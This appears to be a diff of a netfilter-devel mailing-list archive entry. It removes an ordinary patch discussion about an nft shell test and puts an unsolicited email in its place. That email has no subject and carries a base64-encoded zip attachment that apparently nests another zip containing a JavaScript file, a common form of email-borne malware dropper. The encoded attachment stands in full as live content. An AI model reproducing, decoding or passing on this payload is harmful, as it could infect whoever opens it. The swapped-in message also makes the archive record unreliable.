@@ -1,114 +1,104 @@
-From: Shyam Saini <mayhs11saini@gmail.com>
-Subject: Re: [PATCHv2] tests: shell: Add test for ambguity while setting the value
-Date: Mon, 12 Jun 2017 16:54:18 +0530
-Message-ID: <CAOfkYf6PiXccqcrXKnFJt50nQC8Zh-c0NNnUA_rD0HCoLvxeSQ@mail.gmail.com>
-References: <1497024060-6142-1-git-send-email-mayhs11saini@gmail.com>
- <20170612092207.GA3997@salvia> <CAOfkYf7evsUh4k_xZfUyU-MU0mMo=RH2VLruQX6ADTRo7o1N9w@mail.gmail.com>
- <20170612104940.GA7990@salvia>
+From: <amin@goettingen.aidshilfe.de>
+Subject: (unknown)
+Date: Mon, 12 Jun 2017 15:02:56 -0000
+Message-ID: <149727977694.23066.7893246225585409822@qubee.com.bd>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: Netfilter Development Mailing list
-        <netfilter-devel@vger.kernel.org>
-To: Pablo Neira Ayuso <pablo@netfilter.org>
+Content-Type: application/zip; name="311766356839.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from mail-ot0-f176.google.com ([74.125.82.176]:34952 "EHLO
-        mail-ot0-f176.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752545AbdFLLYU (ORCPT
+Received: from AWBL11-177.qubee.com.bd ([180.234.11.177]:52081 "HELO
+        qubee.com.bd" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752044AbdFLPDE (ORCPT
         <rfc822;netfilter-devel@vger.kernel.org>);
-        Mon, 12 Jun 2017 07:24:20 -0400
-Received: by mail-ot0-f176.google.com with SMTP id a2so64583877oth.2
-        for <netfilter-devel@vger.kernel.org>; Mon, 12 Jun 2017 04:24:19 -0700 (PDT)
-In-Reply-To: <20170612104940.GA7990@salvia>
+        Mon, 12 Jun 2017 11:03:04 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-On Mon, Jun 12, 2017 at 4:19 PM, Pablo Neira Ayuso <pablo@netfilter.org> wrote:
-> On Mon, Jun 12, 2017 at 04:16:16PM +0530, Shyam Saini wrote:
->> On Mon, Jun 12, 2017 at 2:52 PM, Pablo Neira Ayuso <pablo@netfilter.org> wrote:
->> > On Fri, Jun 09, 2017 at 09:31:00PM +0530, Shyam Saini wrote:
->> >> diff --git a/tests/shell/testcases/sets/0023unknown_value_to_use_0 b/tests/shell/testcases/sets/0023unknown_value_to_use_0
->> >> new file mode 100755
->> >> index 0000000..ee9be68
->> >> --- /dev/null
->> >> +++ b/tests/shell/testcases/sets/0023unknown_value_to_use_0
->> >> @@ -0,0 +1,33 @@
->> >> +#!/bin/bash
->> >> +
->> >> +     # This test checks bug identified and fixed in the commit Id "986dea8".
->> >> +     # i.e, If in a statement there are  multiple src data then it would be totally ambiguous to decide which value to set.
->> >> +
->> >> +     # Before this commit 986dea8, nft returns 134 which indicates the bug but after this commit it returns 1.
->> >> +     # We don't add this test in python testsuite, because there we can't detect 134 != 1 (returns code stating failure)
->> >> +
->> >> +declare -a rules=(
->> >> +"tcp dport set {1, 2, 3}" "udp dport set {1, 2, 3}"
->> >> +"meta pkttype set {unicast, multicast, broadcast}"
->> >> +"meta mark set {0xffff, 0xcc}"
->> >> +"ct mark set {0x11333, 0x11}" "ct zone set {123, 127}"
->> >> +"ct label set {123, 127}"
->> >> +"ct event set {new, related, destroy, label}"
->> >> +"ether daddr set {01:00:5e:00:01:01, 01:00:5e:00:02:02}"
->> >> +"ip saddr set {192.19.1.2, 191.1.22.1}"
->> >> +)
->> >> +
->> >> +$NFT add table t
->> >> +$NFT add chain t c
->> >> +
->> >> +for (( i = 0 ; i < ${#rules[@]} ; i++ ))
->> >> +do
->> >> +     $NFT add rule t c ${rules[$i]}
->> >> +     ret=$?
->> >> +     if [ $ret -ne 1 ];
->> >> +     then
->> >> +             echo "E: failed test: returned $ret instead of 1" >&2
->> >> +             exit 1
->> >> +     fi
->> >> +done
->> >
->> > Better use tests/py/ for this?
->>
->> We only have "ok" and "fail" as return codes in python test suites and
->> we can't can't detect 134 != 1 there.
->
-> Not sure what you mean "we can't can't detect 134 != 1 there."
-> You probably refer to the fact that we cannot distinguish between
-> assertion failure and command failure?
->
-
-Yes,
-Sorry my bad. I was missing the  context.
-
-I'm adding snippet from Arturo where he explained why we don't add
-this in python test suite
-
-                          "They are good candidates for the python testsuite,
-                           but there we have no way to detect return
-codes (apart of fail/ok), so we can't
-                           detect 134 != 1 (which both indicates failure)"
-
-
->> So it was added in the tests/shell/.
->>
->> further we would need "*.payload" file for that respective test.
->>
->> $ nft --debug=netlink add rule t c udp dport set {1, 3}
->>
->> But in our case it is not generated at all.
->
-> We have no *.payload for tests that fail anyway, right?
-
-say we add some test.t file in the tests suite then don't we need
-corresponding test.t.payload file?
-and in our case we if add some test.t file as our test then wouldn't
-we need corresponding test.t.payload file?
-
-
->> Is it right ?
->
-> Probably I missing anything, I'm asking because I just wondering if py
-> tests would be a better fit for this.
-
-Do we still need this in python test suite?
-
-Thanks,
-Shyam
+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
+BgAAAAABAAEAWgAAAFcSAAAAAA==
